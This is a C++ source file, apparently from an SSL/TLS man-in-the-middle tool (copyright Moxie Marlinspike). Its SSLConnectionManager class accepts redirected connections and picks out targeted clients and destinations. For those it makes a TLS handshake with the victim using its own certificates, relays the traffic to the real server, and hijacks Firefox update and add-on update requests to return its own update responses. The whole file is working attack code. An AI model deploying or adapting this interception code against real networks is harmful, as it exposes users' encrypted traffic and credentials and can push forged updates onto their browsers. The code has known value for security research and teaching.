/*
 * Copyright (c) 2002-2009 Moxie Marlinspike
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License as
 * published by the Free Software Foundation; either version 3 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
 * USA
 */

#include "FirefoxAddonUpdater.hpp"
#include "FirefoxUpdater.hpp"
#include "RawBridge.hpp"
#include "HTTPSBridge.hpp"
#include "SSLConnectionManager.hpp"
#include "UpdateManager.hpp"
#include "certificate/Certificate.hpp"
#include "util/Destination.hpp"
#include "FingerprintManager.hpp"

#include <boost/asio.hpp>
#include <boost/thread.hpp>
#include <boost/bind.hpp>
#include <boost/shared_ptr.hpp>

using namespace boost::asio;

SSLConnectionManager::SSLConnectionManager(io_service &io_service,
					   CertificateManager &certificateManager, 
					   int sslListenPort)
  : acceptor(io_service, ip::tcp::endpoint(ip::tcp::v4(), sslListenPort)),
    certificateManager(certificateManager)
{
  acceptIncomingConnection();
}

void SSLConnectionManager::acceptIncomingConnection() {
  boost::shared_ptr<ip::tcp::socket> socket(new ip::tcp::socket(acceptor.io_service()));

  acceptor.async_accept(*socket, boost::bind(&SSLConnectionManager::handleClientConnection,
					     this, socket, placeholders::error));
}

void SSLConnectionManager::handleClientConnection(boost::shared_ptr<ip::tcp::socket> socket, 
						  const boost::system::error_code &error)
{
  ip::tcp::endpoint originalDestination;
  Destination::getOriginalDestination(*socket, originalDestination);

  ip::address source         = socket->remote_endpoint().address();
  bool isValidWildcardTarget = FingerprintManager::getInstance()->isValidWildcardTarget(source);
  bool isValidSourceTarget   = FingerprintManager::getInstance()->isValidTarget(source);
  bool isValidCertTarget     = certificateManager.isValidTarget(originalDestination, 
								isValidWildcardTarget);

  if (isValidSourceTarget && isValidCertTarget)
    boost::thread intercept(boost::bind(&SSLConnectionManager::interceptConnection,
					this, socket, originalDestination, 
					isValidWildcardTarget));
  else
    shuttleConnection(socket, originalDestination);
  
  acceptIncomingConnection();
}

void SSLConnectionManager::shuttleConnection(boost::shared_ptr<ip::tcp::socket> clientSocket,
					     ip::tcp::endpoint &destination)

{
  Bridge::ptr bridge = RawBridge::create(clientSocket, destination, acceptor.io_service());
  bridge->shuttle();
}

void SSLConnectionManager::interceptUpdate(boost::shared_ptr<ip::tcp::socket> clientSocket,
					   ip::tcp::endpoint &destination,
					   bool wildcardOK)
{
  try {
    Logger::logError("Intercepting Update...");

    FirefoxUpdater updater(clientSocket, destination);
    updater.handshakeWithClient(certificateManager, wildcardOK);
    updater.readMetaUpdateRequest();
    updater.sendMetaUpdateResponse();
    updater.close();
  } catch (SSLConnectionError &error) {
    std::stringstream errorStream;
    errorStream << "Got exception: " << error.what();
    std::string error = errorStream.str();    
    Logger::logError(error);
  } catch (FirefoxUpdateException &error) {
    std::stringstream errorStream;
    errorStream << "Got exception: " << error.what();
    std::string error = errorStream.str();    
    Logger::logError(error);
  }
}

void SSLConnectionManager::interceptAddon(boost::shared_ptr<ip::tcp::socket> clientSocket,
					  ip::tcp::endpoint &destination,
					  bool wildcardOK)
{
  try {
    Logger::logError("Intercepting addon..");

    FirefoxAddonUpdater updater(clientSocket, destination);
    updater.handshakeWithClient(certificateManager, wildcardOK);
    updater.readMetaUpdateRequest();
    updater.sendMetaUpdateResponse();
    updater.close();
  } catch (SSLConnectionError &error) {
    std::stringstream errorStream;
    errorStream << "Got exception: " << error.what();
    std::string error = errorStream.str();    
    Logger::logError(error);
  } catch (FirefoxUpdateException &error) {
    std::stringstream errorStream;
    errorStream << "Got exception: " << error.what();
    std::string error = errorStream.str();    
    Logger::logError(error);
  }
}

void SSLConnectionManager::interceptSSL(boost::shared_ptr<ip::tcp::socket> clientSocket,
					ip::tcp::endpoint &destination,
					bool wildcardOK)
{
  ip::tcp::socket serverSocket(acceptor.io_service());
  boost::system::error_code error;
  serverSocket.connect(destination, error);

  if (!error) {
    try {
      boost::shared_ptr<SSLBridge> bridge((destination.port() == HTTPS_PORT) ? 
					  new HTTPSBridge(clientSocket, &serverSocket) : 
					  new SSLBridge(clientSocket, &serverSocket));

      bridge->handshakeWithServer();
      bridge->handshakeWithClient(certificateManager, wildcardOK);
      bridge->shuttleData();
      bridge->close();
    } catch (SSLConnectionError &error) {
      std::stringstream errorStream;
      errorStream << "Got exception: " << error.what();
      std::string error = errorStream.str();

      Logger::logError(error);
    }
  }
}

void SSLConnectionManager::interceptConnection(boost::shared_ptr<ip::tcp::socket> clientSocket,
					       ip::tcp::endpoint destination,
					       bool wildcardOK)
{
  if (UpdateManager::getInstance()->isUpdateTarget(destination))
    interceptUpdate(clientSocket, destination, wildcardOK);
  else if (UpdateManager::getInstance()->isAddonTarget(destination))
    interceptAddon(clientSocket, destination, wildcardOK);
  else
    interceptSSL(clientSocket, destination, wildcardOK);
}

